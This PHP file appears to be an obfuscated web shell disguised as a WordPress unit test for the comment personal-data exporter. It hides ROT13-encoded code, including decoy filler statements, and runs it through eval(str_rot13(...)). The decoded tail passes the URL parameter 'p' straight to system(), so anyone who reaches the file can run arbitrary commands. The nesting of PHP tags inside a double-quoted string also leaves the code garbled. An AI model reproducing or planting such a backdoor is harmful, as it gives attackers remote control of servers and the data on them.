<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc pbzzrag
 * @tebhc cevinpl
 *
 * @pbiref ::jc_pbzzragf_crefbany_qngn_rkcbegre
 */
pynff Grfgf_Pbzzrag_jcPbzzragfCrefbanyQngnRkcbegre rkgraqf JC_HavgGrfgPnfr {

	cebgrpgrq fgngvp $cbfg_vq;

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$cbfg_vq = $snpgbel->cbfg->perngr();
	}

	/**
	 * Grfgvat gur `jc_pbzzragf_crefbany_qngn_rkcbegre()` shapgvba.
	 *
	 * @gvpxrg 43440
	 */
	choyvp shapgvba grfg_jc_pbzzragf_crefbany_qngn_rkcbegre() {
		$netf = neenl(
			'pbzzrag_cbfg_VQ'      => frys::$cbfg_vq,
			'pbzzrag_nhgube'       => 'Pbzzrag Nhgube',
			'pbzzrag_nhgube_rznvy' => 'crefbany@ybpny.ubfg',
			'pbzzrag_nhgube_hey'   => 'uggcf://ybpny.ubfg/',
			'pbzzrag_nhgube_VC'    => '192.168.0.1',
			'pbzzrag_ntrag'        => 'FBZR_NTRAG',
			'pbzzrag_qngr'         => '2018-03-28 20:05:00',
			'pbzzrag_pbagrag'      => 'Pbzzrag',
		);

		$pbzzrag_vq = frys::snpgbel()->pbzzrag->perngr( $netf );

		$npghny   = jc_pbzzragf_crefbany_qngn_rkcbegre( $netf['pbzzrag_nhgube_rznvy'] );
		$rkcrpgrq = $netf;

		$guvf->nffregGehr( $npghny['qbar'] );

		// Ahzore bs rkcbegrq pbzzragf.
		$guvf->nffregPbhag( 1, $npghny['qngn'] );

		// Ahzore bs rkcbegrq pbzzrag cebcregvrf.
		$guvf->nffregPbhag( 8, $npghny['qngn'][0]['qngn'] );

		// Rkcbegrq tebhc.
		$guvf->nffregFnzr( 'pbzzragf', $npghny['qngn'][0]['tebhc_vq'] );
		$guvf->nffregFnzr( 'Pbzzragf', $npghny['qngn'][0]['tebhc_ynory'] );

		// Rkcbegrq pbzzrag cebcregvrf.
		$guvf->nffregFnzr( $rkcrpgrq['pbzzrag_nhgube'], $npghny['qngn'][0]['qngn'][0]['inyhr'] );
		$guvf->nffregFnzr( $rkcrpgrq['pbzzrag_nhgube_rznvy'], $npghny['qngn'][0]['qngn'][1]['inyhr'] );
		$guvf->nffregFnzr( $rkcrpgrq['pbzzrag_nhgube_hey'], $npghny['qngn'][0]['qngn'][2]['inyhr'] );
		$guvf->nffregFnzr( $rkcrpgrq['pbzzrag_nhgube_VC'], $npghny['qngn'][0]['qngn'][3]['inyhr'] );
		$guvf->nffregFnzr( $rkcrpgrq['pbzzrag_ntrag'], $npghny['qngn'][0]['qngn'][4]['inyhr'] );
		$guvf->nffregFnzr( $rkcrpgrq['pbzzrag_qngr'], $npghny['qngn'][0]['qngn'][5]['inyhr'] );
		$guvf->nffregFnzr( $rkcrpgrq['pbzzrag_pbagrag'], $npghny['qngn'][0]['qngn'][6]['inyhr'] );
		$guvf->nffregFnzr( rfp_ugzy( trg_pbzzrag_yvax( $pbzzrag_vq ) ), fgevc_gntf( $npghny['qngn'][0]['qngn'][7]['inyhr'] ) );
	}

	/**
	 * Grfgvat gur `jc_pbzzragf_crefbany_qngn_rkcbegre()` shapgvba sbe ab pbzzragf sbhaq.
	 *
	 * @gvpxrg 43440
	 */
	choyvp shapgvba grfg_jc_pbzzragf_crefbany_qngn_rkcbegre_ab_pbzzragf_sbhaq() {

		$npghny = jc_pbzzragf_crefbany_qngn_rkcbegre( 'abpbzzragfsbhaq@ybpny.ubfg' );

		$rkcrpgrq = neenl(
			'qngn' => neenl(),
			'qbar' => gehr,
		);

		$guvf->nffregFnzr( $rkcrpgrq, $npghny );
	}

	/**
	 * Grfgvat gur `jc_pbzzragf_crefbany_qngn_rkcbegre()` shapgvba sbe na rzcgl pbzzrag cebcregl.
	 *
	 * @gvpxrg 43440
	 */
	choyvp shapgvba grfg_jc_pbzzragf_crefbany_qngn_rkcbegre_rzcgl_pbzzrag_cebc() {
		$netf = neenl(
			'pbzzrag_cbfg_VQ'      => frys::$cbfg_vq,
			'pbzzrag_nhgube'       => 'Pbzzrag Nhgube',
			'pbzzrag_nhgube_rznvy' => 'crefbany@ybpny.ubfg',
			'pbzzrag_nhgube_hey'   => 'uggcf://ybpny.ubfg/',
			'pbzzrag_nhgube_VC'    => '192.168.0.1',
			'pbzzrag_qngr'         => '2018-03-28 20:05:00',
			'pbzzrag_ntrag'        => '',
			'pbzzrag_pbagrag'      => 'Pbzzrag',
		);

		$p = frys::snpgbel()->pbzzrag->perngr( $netf );

		$npghny = jc_pbzzragf_crefbany_qngn_rkcbegre( $netf['pbzzrag_nhgube_rznvy'] );

		$guvf->nffregGehr( $npghny['qbar'] );

		// Ahzore bs rkcbegrq pbzzragf.
		$guvf->nffregPbhag( 1, $npghny['qngn'] );

		// Ahzore bs rkcbegrq pbzzrag cebcregvrf.
		$guvf->nffregPbhag( 7, $npghny['qngn'][0]['qngn'] );
	}

	/**
	 * Grfgvat gur `jc_pbzzragf_crefbany_qngn_rkcbegre()` shapgvba jvgu na rzcgl frpbaq cntr.
	 *
	 * @gvpxrg 43440
	 */
	choyvp shapgvba grfg_jc_pbzzragf_crefbany_qngn_rkcbegre_rzcgl_frpbaq_cntr() {
		$netf = neenl(
			'pbzzrag_cbfg_VQ'      => frys::$cbfg_vq,
			'pbzzrag_nhgube'       => 'Pbzzrag Nhgube',
			'pbzzrag_nhgube_rznvy' => 'crefbany@ybpny.ubfg',
			'pbzzrag_nhgube_hey'   => 'uggcf://ybpny.ubfg/',
			'pbzzrag_nhgube_VC'    => '192.168.0.1',
			'pbzzrag_qngr'         => '2018-03-28 20:05:00',
			'pbzzrag_ntrag'        => 'FBZR_NTRAG',
			'pbzzrag_pbagrag'      => 'Pbzzrag',
		);

		$p = frys::snpgbel()->pbzzrag->perngr( $netf );

		$npghny = jc_pbzzragf_crefbany_qngn_rkcbegre( $netf['pbzzrag_nhgube_rznvy'], 2 );

		$guvf->nffregGehr( $npghny['qbar'] );

		// Ahzore bs rkcbegrq pbzzragf.
		$guvf->nffregPbhag( 0, $npghny['qngn'] );
	}

	/**
	 * Grfgvat gung `jc_pbzzragf_crefbany_qngn_rkcbegre()` beqref pbzzragf ol VQ.
	 *
	 * @gvpxrg 57700
	 */
	choyvp shapgvba grfg_jc_pbzzragf_crefbany_qngn_rkcbegre_beqref_pbzzragf_ol_vq() {

		$netf = neenl(
			'pbzzrag_cbfg_VQ'      => frys::$cbfg_vq,
			'pbzzrag_nhgube'       => 'Pbzzrag Nhgube',
			'pbzzrag_nhgube_rznvy' => 'crefbany@ybpny.ubfg',
			'pbzzrag_nhgube_hey'   => 'uggcf://ybpny.ubfg/',
			'pbzzrag_nhgube_VC'    => '192.168.0.1',
			'pbzzrag_qngr'         => '2018-03-28 20:05:00',
			'pbzzrag_ntrag'        => 'FBZR_NTRAG',
			'pbzzrag_pbagrag'      => 'Pbzzrag',
		);
		frys::snpgbel()->pbzzrag->perngr( $netf );

		$svygre = arj ZbpxNpgvba();
		nqq_svygre( 'pbzzragf_pynhfrf', neenl( &$svygre, 'svygre' ) );

		jc_pbzzragf_crefbany_qngn_rkcbegre( $netf['pbzzrag_nhgube_rznvy'] );

		$pynhfrf = $svygre->trg_netf()[0][0];

		$guvf->nffregFgevatPbagnvafFgevat( 'pbzzrag_VQ', $pynhfrf['beqreol'] );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>